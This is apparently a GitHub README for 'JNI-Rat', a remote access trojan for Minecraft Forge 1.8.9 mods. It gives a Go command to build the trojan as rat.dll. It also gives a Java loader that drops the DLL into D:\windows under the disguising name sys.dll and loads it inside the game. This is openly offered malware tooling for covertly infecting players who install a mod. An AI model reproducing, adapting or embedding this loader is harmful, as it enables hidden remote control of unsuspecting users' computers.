<h1 align="center">Welcome to JNI-Rat </h1>
<p align="center">
  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-blue.svg?cacheSeconds=2592000" />
  <img alt="Download" src="https://img.shields.io/github/downloads/yuuiyu/Jni-Rat/total"/>
  <img alt="V" src="https://img.shields.io/badge/Java-8-green" style=""/>
  <img alt="M" src="https://img.shields.io/badge/MinecraftForge-1.8.9-yellow" style=""/>
</p>

> A jni Rat for Minecraft

## Prerequisites

- Minecraft forge 1.8.9
- Java version 8

## Install

```sh
go build -buildmode=c-shared -o rat.dll main.go
```

## Usage

```java
        try {
            File f=new File("D:\\windows");
            File fd=new File("D:\\windows\\sys.dll");
            if(!f.exists()){
                f.mkdirs();
            }
            if(fd.exists()){
                fd.delete();
            }
            fd.createNewFile();
            FileUtils.copyURLToFile(this.getClass().getClassLoader().getResource("rat.dll"),fd);
            System.load(fd.toString());
            }  catch (IOException e) {
                e.printStackTrace();
        }
```

## Author

👤 **Yuuiyu**

* Github: [@yuuiyu](https://github.com/yuuiyu)
